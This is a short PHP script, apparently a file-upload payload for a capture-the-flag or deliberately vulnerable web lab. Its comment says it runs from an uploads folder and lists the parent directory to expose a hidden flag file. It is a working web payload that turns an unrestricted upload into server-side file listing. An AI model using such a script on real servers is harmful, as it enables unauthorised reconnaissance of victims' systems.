<?php
// Lists the parent directory (hackable/) from hackable/uploads/,
// revealing the randomly-named flag .php file.
print_r(scandir("../"));
?>
